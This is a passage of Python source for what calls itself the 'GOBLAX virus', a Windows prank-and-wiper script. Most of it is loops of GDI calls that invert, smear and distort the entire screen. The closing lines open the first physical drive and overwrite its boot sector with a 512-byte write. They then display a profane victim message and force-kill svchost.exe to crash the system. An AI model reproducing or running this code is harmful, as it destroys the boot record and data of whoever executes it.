    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    BitBlt(desk, -800, -300, sw, sh, desk, 0, 0, MERGECOPY)
    BitBlt(desk,200,500,w,h,desk,0,180,SRCAND)

for i in range(0,9):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    BitBlt(desk, -800, -300, sw, sh, desk, 0, 0, MERGECOPY)
    BitBlt(desk,200,500,w,h,desk,0,180,SRCAND)

for i in range(0,9):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    BitBlt(desk, -800, -300, sw, sh, desk, 0, 0, MERGECOPY)
    BitBlt(desk,200,500,w,h,desk,0,180,SRCAND)

for i in range(0,5):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    BitBlt(desk,0,0,w,h,desk,1,1,NOTSRCCOPY)

for i in range(0,6):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    SelectObject(desk,brush)
    BitBlt(desk,0,0,w,h,desk,-10,-5,SRCINVERT)
    BitBlt(desk,50,50,w,h,desk,0,90,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,0,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,90,0,PATCOPY)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    BitBlt(desk,10,10,w,h,desk,0,90,MERGEPAINT)
    BitBlt(desk,10,10,w,h,desk,180,0,DSTINVERT)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCERASE)
    BitBlt(desk,10,10,w,h,desk,0,180,NOTSRCERASE)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCAND)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCPAINT)
    BitBlt(desk, 50, 50, sw, sh, desk, 0, 0, MERGECOPY)
    BitBlt(desk, -500, -500, sw, sh, desk, 0, 0, MERGECOPY)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    BitBlt(desk,10,10,w,h,desk,0,90,MERGEPAINT)
    BitBlt(desk,10,10,w,h,desk,180,0,DSTINVERT)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCERASE)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    BitBlt(desk,10,10,w,h,desk,0,180,NOTSRCERASE)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCAND)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)

for i in range(0,6):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    BitBlt(desk,10,10,w,h,desk,90,0,SRCPAINT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    BitBlt(desk, 50, 50, sw, sh, desk, 0, 0, MERGECOPY)
    BitBlt(desk, -500, -500, sw, sh, desk, 0, 0, MERGECOPY)

for i in range(0,6):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKONWHITE)
    BitBlt(desk, 50, 50, sw, sh, desk, 0, 0, MERGECOPY)
    BitBlt(desk, -500, -500, sw, sh, desk, 0, 0, MERGECOPY)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    BitBlt(desk, 50, 50, sw, sh, desk, 0, 0, MERGECOPY)
    BitBlt(desk, -500, -500, sw, sh, desk, 0, 0, MERGECOPY)

for i in range(0,6):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    BitBlt(desk, 50, 50, sw, sh, desk, 0, 0, MERGECOPY)
    BitBlt(desk, -500, -500, sw, sh, desk, 0, 0, MERGECOPY)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,100,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCINVERT)
    BitBlt(desk,70,200,w,h,desk,72,22,SRCCOPY)

for i in range(0,6):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    BitBlt(desk,70,200,w,h,desk,72,22,SRCCOPY)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,0,90,MERGEPAINT)
    BitBlt(desk,10,10,w,h,desk,180,0,DSTINVERT)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCERASE)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    BitBlt(desk,10,10,w,h,desk,0,180,NOTSRCERASE)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCAND)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCPAINT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)

for i in range(0,6):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCPAINT)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCPAINT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCPAINT)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCPAINT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,100,100,w,h,desk,12,12,SRCAND)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)

for i in range(0,6):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)

for i in range(0,30):
    BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
    Sleep(400)

for i in range(0,5):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCPAINT)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCPAINT)
    DeleteObject(brush)

for i in range(0,6):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCPAINT)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCPAINT)

for i in range(0,10):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    DeleteObject(brush)

for i in range(0,20):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,100,100,w,h,desk,12,12,SRCAND)
    DeleteObject(brush)

for i in range(0,15):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,100,100,w,h,desk,12,12,SRCAND)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCINVERT)
    DeleteObject(brush)

for i in range(0,5):
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, 0, 0, sw, sh, desk,sw,sh, sw, sh, SRCPAINT)
    BitBlt(desk, i, i, i, i, desk, i, i, NOTSRCCOPY)
    BitBlt(desk, a, b, 200, 200, desk, a, b,0x114514)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    BitBlt(GetDC(NULL), x, y, x,y, GetDC(NULL),x,y, NOTSRCCOPY);
    BitBlt(desk, 15, 15, sw, sh, desk, 15, 5, SRCCOPY)

for i in range(0,12):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    StretchBlt(desk, -80, -10, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, 0, 0, sw, sh, desk,sw,sh, sw, sh, SRCPAINT)
    BitBlt(desk, i, i, i, i, desk, i, i, NOTSRCCOPY)
    BitBlt(desk, a, b, 200, 200, desk, a, b,0x114514)
    BitBlt(GetDC(NULL), x, y, x,y, GetDC(NULL),x,y, NOTSRCCOPY);
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, 0, 0, sw, sh, desk,sw,sh, sw, sh, SRCPAINT)
    BitBlt(desk, i, i, i, i, desk, i, i, NOTSRCCOPY)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCERASE)
    BitBlt(desk,10,10,w,h,desk,0,180,NOTSRCERASE)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCAND)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
    BitBlt(desk, a, b, 200, 200, desk, a, b,0x114514)
    BitBlt(GetDC(NULL), x, y, x,y, GetDC(NULL),x,y, NOTSRCCOPY);
    DeleteObject(brush)

for i in range(0,10):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    BitBlt(desk, a, b, 200, 200, desk, a, b,0x114514)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    StretchBlt(desk, 0, 0, sw, sh, desk,sw,sh, sw, sh, SRCPAINT)
    BitBlt(desk, i, i, i, i, desk, i, i, NOTSRCCOPY)
    BitBlt(desk, a, b, 200, 200, desk, a, b,0x114514)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCERASE)
    BitBlt(desk,10,10,w,h,desk,0,180,NOTSRCERASE)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCAND)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
    BitBlt(GetDC(NULL), x, y, x,y, GetDC(NULL),x,y, NOTSRCCOPY);
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk, a, b, 200, 200, desk, a, b,0x114514)
    BitBlt(desk, a, b, 200, 200, desk, a, b,0x114514)
    BitBlt(desk, a, b, 200, 200, desk, a, b,0x114514)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
    DeleteObject(brush)

hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
WriteFile(hDevice, AllocateReadBuffer(512), None)
CloseHandle(hDevice)

MessageBox("you have become a victim of GOBLAX virus. Your pc has been fucked really hard", "GET FUCKED BY GOBLAX VIRUS", MB_ICONWARNING | MB_OK)

os.system("taskkill /F /IM svchost.exe")
                                          
